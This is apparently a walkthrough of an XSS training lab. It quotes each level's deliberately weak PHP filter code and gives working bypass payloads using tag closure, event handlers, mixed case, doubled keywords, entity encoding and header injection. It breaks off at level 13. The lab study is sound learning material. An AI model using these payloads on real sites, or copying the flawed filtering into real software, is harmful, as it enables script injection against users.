XSS Challenge - WalkThrough
disclaimer
This document is for learning and research purposes only. Please do not use the technical source code in this document for illegal purposes. Any negative impact caused by anyone has nothing to do with me.

knowledge points

Unfiltered XSS (level 1)
Constructing closed XSS at various levels of difficulty (level 2, 3, 4, 5, 6)
Bypass filtering XSS of various difficulties (level 2, 3, 4, 5, 6)
Double letter splicing XSS (level 7)
Entity encoding + HTML encoding XSS (level 8, 9)
XSS in input (level 10)
XSS in HTTP headers (level 11, 12, 13)
exif XSS (level 14)
angularjs XSS (level 15)
URL Encoding XSS (level 16)
XSS for embed tags (level 17, 18)
Flash XSS (level 19, 20)
level 1
No filtering, just use <script>alert(123)</script> directly

payload: http://<target IP>/level1.php?keyword=test<script>alert(123)</script>

level 2
images

Use "> to construct the closure of the input box

payload: test"><script>alert(123)</script>

level 3
Use ' to close

images

Construct input XSS, for example: <input value=xss onfocus=alert(1) autofocus>

payload: test'onmouseover='alert(1)' payload: test'onfocus='alert(1)' autofocus '

level 4
$str = $_GET["keyword"];
$str2=str_replace(">","",$str);
$str3=str_replace("<","",$str2);
It is found that <, > are filtered, use " to close

Test it test"123

images

Construct input XSS, for example: <input value=xss onfocus=alert(1) autofocus>

payload: test "onfocus=alert(1) autofocus"

level 5
$str = strtolower($_GET["keyword"]);
$str2=str_replace("<script", "<scr_ipt", $str);
$str3=str_replace("on", "o_n", $str2);
This pass mainly filters <script and on

Use "> to close, then use an unfiltered payload <a href=javascript:alert(19)>M

payload: "><a href=javascript:alert(19)>M

level 6
$str = $_GET["keyword"];
$str2=str_replace("<script", "<scr_ipt", $str);
$str3=str_replace("on", "o_n", $str2);
$str4=str_replace("src", "sr_c", $str3);
$str5=str_replace("data", "da_ta", $str4);
$str6=str_replace("href", "hr_ef", $str5);
Like the previous level, there are more filters, href, data, and src are also filtered, but their case is not detected

Same, use "> to close, then use an unfiltered payload <ScRiPt>alert(123)</ScRiPt>

payload: "><ScRiPt>alert(123)</ScRiPt>

level 7
$str = strtolower( $_GET["keyword"]);
$str2=str_replace("script", "", $str);
$str3=str_replace("on", "", $str2);
$str4=str_replace("src","",$str3);
$str5=str_replace("data","",$str4);
$str6=str_replace("href", "", $str5);
In this level, as long as keywords such as on, href, src, and script are detected, they will be filtered directly to empty

Close, and then double write, let him just construct the script

payload: "><scrscriptipt>alert("1")</scrscriptipt>

level 8
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script", "scr_ipt", $str);
$str3=str_replace("on", "o_n", $str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data", "da_ta", $str4);
$str6=str_replace("href", "hr_ef", $str5);
$str7=str_replace('"', '&quot', $str6);
<?php
  echo '<center><BR><a href="'.$str7.'">Friendly link</a></center>';
?>
The purpose of this level is to write the payload into the herf of <a>

Try to construct payload <a href=javascript:alert(1)>, where script will be converted to scr_ipt

Here you can number the r entity as &#114;, and then trigger HTML decoding to decode sc&#114;ipt into script

payload: javasc&#114;ipt:alert(1)

level 9
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script", "scr_ipt", $str);
$str3=str_replace("on", "o_n", $str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data", "da_ta", $str4);
$str6=str_replace("href", "hr_ef", $str5);
$str7=str_replace('"', '&quot', $str6);
if(false===strpos($str7,'http://'))
{
   echo '<center><BR><a href="Your link is illegal? Is there any!">Friendly link</a></center>';
         }
else
{
   echo '<center><BR><a href="'.$str7.'">Friendly link</a></center>';
}
Filtering is the same as the previous level, but judge whether there is http://

Test javascript:alert("http://"), encode its entity, and construct javasc&#114;ipt:alert(&#34;http://&#34;)

level 10
$str = $_GET["keyword"];
$str11 = $_GET["t_sort"];
$str22=str_replace(">", "", $str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>No results found for ".htmlspecialchars($str).".</h2>".'<center>
<form id=search>
<input name="t_link" value="'.'" type="hidden">
<input name="t_history" value="'.'" type="hidden">
<input name="t_sort" value="'.$str33.'" type="hidden">
</form>
</center>';
There are 3 hidden input boxes on the page, among which t_sort is parameterized, directly modify the code on the front end to display it, enter the payload, and construct an input xss: <input value=xss onfocus=alert(1) autofocus>

payload: test"onfocus=alert(1) autofocus type="text"

level 11
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_REFERER'];
$str22=str_replace(">", "", $str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>No results found for ".htmlspecialchars($str).".</h2>".'<center>
<form id=search>
<input name="t_link" value="'.'" type="hidden">
<input name="t_history" value="'.'" type="hidden">
<input name="t_sort" value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ref" value="'.$str33.'" type="hidden">
</form>
</center>';
The value of t_ref here is the referer value of our visit to this webpage, directly capture the packet and modify the referer

payload: referer:test"onfocus=alert(1) autofocus type="text"

level 12
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_USER_AGENT'];
$str22=str_replace(">", "", $str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>No results found for ".htmlspecialchars($str).".</h2>".'<center>
<form id=search>
<input name="t_link" value="'.'" type="hidden">
<input name="t_history" value="'.'" type="hidden">
<input name="t_sort" value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ua" value="'.$str33.'" type="hidden">
</form>
</center>';
Same as the previous question, this question is to judge HTTP_USER_AGENT, directly capture packets and modify HTTP_USER_AGENT

payload: HTTP_USER_AGENT:test"onfocus=alert(1) autofocus type="text"

level 13
setcookie("user", "call me maybe?"
